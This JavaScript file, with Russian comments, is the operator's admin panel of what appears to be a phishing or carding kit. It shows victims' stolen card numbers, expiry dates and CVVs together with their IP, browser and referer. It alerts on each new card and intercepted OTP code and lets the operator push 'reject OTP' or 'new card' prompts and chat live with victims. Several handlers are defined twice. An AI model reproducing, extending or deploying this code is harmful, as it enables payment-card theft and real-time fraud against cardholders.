const socket = io('https://localhost:3000', {
    withCredentials: true,
    rejectUnauthorized: false
});
const cardList = document.getElementById('card-list');
const chatContainer = document.getElementById('chat-container');
const chatMessages = document.getElementById('chat-messages');
const chatInput = document.getElementById('chat-message');
const sendMessage = document.getElementById('send-message');
const searchInput = document.querySelector('.search-box input');
const soundToggle = document.querySelector('.sound-toggle');
const actionButtons = document.querySelectorAll('.action-button');
const connectionsCount = document.getElementById('connections-count');
const messageModal = document.getElementById('message-modal');
const notificationText = document.getElementById('notification-text');
const sendNotification = document.getElementById('send-notification');
const cancelNotification = document.getElementById('cancel-notification');
const cardsList = document.getElementById('cards-list');
const closeChat = document.querySelector('.close-chat');
const activeUsersCount = document.querySelector('.active-users .count');
const soundButton = document.querySelector('.sound-btn');
const logoutButton = document.querySelector('.logout-btn');

let soundEnabled = true;
let selectedCardId = null;
let currentAction = null;

// Функция для форматирования даты
function formatDate(date) {
    const d = new Date(date);
    return `${d.getDate().toString().padStart(2, '0')}/${(d.getMonth() + 1).toString().padStart(2, '0')}/${d.getFullYear()}`;
}

// Функция для создания строки таблицы
function createTableRow(data) {
    const row = document.createElement('tr');
    row.dataset.id = data.id;
    row.innerHTML = `
        <td>${data.id}</td>
        <td>${data.name || '-'}</td>
        <td>${data.number || '-'}</td>
        <td>${data.exp || '-'}</td>
        <td>${data.cvv || '-'}</td>
        <td>${formatDate(data.created_at) || '-'}</td>
        <td>${data.clientInfo?.ip || '-'}</td>
        <td>${data.clientInfo?.ua || '-'}</td>
        <td>${data.clientInfo?.referer || '-'}</td>
        <td>
            <button class="action-btn show-otp" data-id="${data.id}">OTP</button>
            <button class="action-btn reject" data-id="${data.id}">Reject</button>
            <button class="action-btn new-card" data-id="${data.id}">New Card</button>
        </td>
    `;

    row.querySelectorAll('.action-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            selectedCardId = btn.dataset.id;
            const action = btn.classList[1];
            
            switch(action) {
                case 'show-otp':
                    socket.emit('show-otp', { id: selectedCardId });
                    break;
                case 'reject':
                    openModal('reject-otp', 'Введите причину отказа');
                    break;
                case 'new-card':
                    openModal('new-card', 'Введите сообщение для запроса новой карты');
                    break;
            }
        });
    });

    return row;
}

// Функция для обновления данных таблицы
function updateTable(data) {
    cardList.innerHTML = '';
    data.forEach(item => {
        cardList.appendChild(createTableRow(item));
    });
}

// Функция для добавления сообщения в чат
function addChatMessage(message, isAdmin = true) {
    const messageDiv = document.createElement('div');
    messageDiv.className = `chat-message ${isAdmin ? 'admin' : 'user'}`;
    messageDiv.textContent = message;
    chatMessages.appendChild(messageDiv);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

// Функция для воспроизведения звука
function playSound(type) {
    if (!soundEnabled) return;
    
    const audio = new Audio();
    switch(type) {
        case 'new':
            audio.src = '/admin/sounds/new.mp3';
            break;
        case 'success':
            audio.src = '/admin/sounds/success.mp3';
            break;
        case 'error':
            audio.src = '/admin/sounds/error.mp3';
            break;
    }
    audio.play().catch(err => console.log('Ошибка воспроизведения звука:', err));
}

// Функция для показа уведомления
function showNotification(message, type = 'info') {
    const container = document.createElement('div');
    container.className = 'notification-container';
    
    let icon = '💬';
    if (type === 'error') icon = '❌';
    if (type === 'success') icon = '✅';
    
    container.innerHTML = `
        <span class="notification-icon">${icon}</span>
        <span class="notification-message">${message}</span>
        <button class="notification-close">×</button>
    `;
    
    document.body.appendChild(container);
    
    // Удаление по клику на крестик
    container.querySelector('.notification-close').addEventListener('click', () => {
        container.remove();
    });
    
    // Автоматическое удаление через 5 секунд
    setTimeout(() => {
        if (document.body.contains(container)) {
            container.remove();
        }
    }, 5000);
}

// Функция для открытия модального окна
function openModal(action, title = 'Введите сообщение') {
    currentAction = action;
    messageModal.querySelector('h3').textContent = title;
    notificationText.value = '';
    messageModal.style.display = 'flex';
}

// Обработчики событий для кнопок действий
actionButtons.forEach(button => {
    button.addEventListener('click', () => {
        if (!selectedCardId) {
            alert('Выберите карту для выполнения действия');
            return;
        }

        const action = button.classList[1];
        switch(action) {
            case 'success':
                socket.emit('show-otp', { id: selectedCardId });
                break;
            case 'fail':
                openModal('reject-otp', 'Введите причину отказа');
                break;
            case 'card':
                openModal('new-card', 'Введите сообщение для запроса новой карты');
                break;
            // ... другие действия ...
        }
    });
});

// Обработчики модального окна
sendNotification.addEventListener('click', () => {
    const message = notificationText.value.trim();
    if (!message) return;

    switch(currentAction) {
        case 'reject-otp':
            socket.emit('reject-otp', { id: selectedCardId, message });
            break;
        case 'new-card':
            socket.emit('request-new-card', { id: selectedCardId, message });
            break;
    }
    
    messageModal.style.display = 'none';
});

cancelNotification.addEventListener('click', () => {
    messageModal.style.display = 'none';
});

// Обработчик поиска
searchInput.addEventListener('input', (e) => {
    const searchTerm = e.target.value.toLowerCase();
    const rows = cardList.getElementsByTagName('tr');
    
    Array.from(rows).forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(searchTerm) ? '' : 'none';
    });
});

// Обработчик переключателя звука
soundToggle.addEventListener('click', () => {
    soundEnabled = !soundEnabled;
    soundToggle.textContent = soundEnabled ? 'Звук вкл.' : 'Звук выкл.';
});

// Обработчики событий чата
sendMessage.addEventListener('click', () => {
    const message = chatInput.value.trim();
    if (message) {
        socket.emit('chat-message', message);
        addChatMessage(message, true);
        chatInput.value = '';
    }
});

chatInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        sendMessage.click();
    }
});

// Socket.io обработчики
socket.on('connect', () => {
    console.log('Подключено к серверу');
    socket.emit('get-cards');
    socket.emit('get-connections-count');
});

socket.on('cards', (data) => {
    console.log('Received cards:', data);
    updateTable(data);
});

socket.on('new-card', (data) => {
    console.log('New card:', data);
    const row = createTableRow(data);
    cardList.insertBefore(row, cardList.firstChild);
    playSound('new');
    showNotification('Получена новая карта', 'info');
});

socket.on('new-otp', (data) => {
    console.log('New OTP:', data);
    showNotification(`Получен новый OTP код: ${data.otp}`, 'info');
    playSound('new');
});

socket.on('payment-confirmed', (data) => {
    console.log('Payment confirmed:', data);
    showNotification('Платеж подтвержден', 'success');
    playSound('success');
});

socket.on('otp-rejected', (data) => {
    console.log('OTP rejected:', data);
    showNotification(data.message || 'OTP отклонен', 'error');
    playSound('error');
});

socket.on('new-card-requested', (data) => {
    console.log('New card requested:', data);
    showNotification(data.message || 'Запрошена новая карта', 'info');
});

// Запрашиваем обновление счетчика каждые 30 секунд
setInterval(() => {
    socket.emit('get-connections-count');
}, 30000);

socket.on('connections-count', (count) => {
    connectionsCount.textContent = count;
    connectionsCount.classList.add('counter-update');
    setTimeout(() => {
        connectionsCount.classList.remove('counter-update');
    }, 300);
});

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    // Запрос начальных данных
    socket.emit('get-cards');
    
    // Обработчик удаления карт
    cardList.addEventListener('click', (e) => {
        if (e.target.classList.contains('delete-btn')) {
            if (confirm('Вы уверены, что хотите удалить эту запись?')) {
                const id = e.target.dataset.id;
                socket.emit('delete-card', { id });
            }
        }
    });
    
    // Обработчик выбора карты
    cardList.addEventListener('click', (e) => {
        const row = e.target.closest('tr');
        if (row) {
            const prevSelected = cardList.querySelector('.selected');
            if (prevSelected) {
                prevSelected.classList.remove('selected');
            }
            row.classList.add('selected');
            selectedCardId = row.querySelector('.delete-btn').dataset.id;
            
            // Очистка и показ чата при выборе новой карты
            chatMessages.innerHTML = '';
            chatContainer.style.display = 'block';
        }
    });
});

// Функция для создания строки таблицы с данными карты
function createCardRow(card) {
    const tr = document.createElement('tr');
    tr.innerHTML = `
        <td>${card.id}</td>
        <td>${card.exp || '-'}</td>
        <td>***</td>
        <td>${card.name || '-'}</td>
        <td>${card.code || '-'}</td>
        <td>${card.site || '-'}</td>
        <td>${card.ip || '-'}</td>
        <td>${card.ua || '-'}</td>
        <td>${card.referer || '-'}</td>
        <td>
            <button class="delete-btn">×</button>
        </td>
    `;
    
    // Обработчик для кнопки удаления
    const deleteBtn = tr.querySelector('.delete-btn');
    deleteBtn.addEventListener('click', () => {
        socket.emit('delete-card', card.id);
        tr.remove();
    });
    
    return tr;
}

// Обработка полученных карт
socket.on('cards', (cards) => {
    cardsList.innerHTML = '';
    cards.forEach(card => {
        cardsList.appendChild(createCardRow(card));
    });
});

// Обработка новой карты
socket.on('new-card', (card) => {
    cardsList.appendChild(createCardRow(card));
});

// Функционал чата
function addChatMessage(message, isAdmin = false) {
    const div = document.createElement('div');
    div.className = `chat-message ${isAdmin ? 'admin' : 'user'}`;
    div.textContent = message;
    chatMessages.appendChild(div);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

sendMessage.addEventListener('click', () => {
    const message = chatInput.value.trim();
    if (message) {
        socket.emit('chat-message', message);
        addChatMessage(message, true);
        chatInput.value = '';
    }
});

chatInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        sendMessage.click();
    }
});

socket.on('chat', (message) => {
    addChatMessage(message, false);
});

// Открытие/закрытие чата
document.querySelector('.action-item:last-child').addEventListener('click', (e) => {
    e.preventDefault();
    chatContainer.style.display = 'block';
});

closeChat.addEventListener('click', () => {
    chatContainer.style.display = 'none';
});

// Поиск
searchInput.addEventListener('input', (e) => {
    const searchTerm = e.target.value.toLowerCase();
    const rows = cardsList.getElementsByTagName('tr');
    
    Array.from(rows).forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(searchTerm) ? '' : 'none';
    });
});

// Звук
soundButton.addEventListener('click', () => {
    soundEnabled = !soundEnabled;
    soundButton.textContent = soundEnabled ? 'Звук вкл.' : 'Звук выкл.';
});

// Выход
logoutButton.addEventListener('click', () => {
    window.location.href = '/logout';
});

// Оновление литератора активных пользователей
socket.on('active-users', (count) => {
    activeUsersCount.textContent = `${count} активных`;
}); 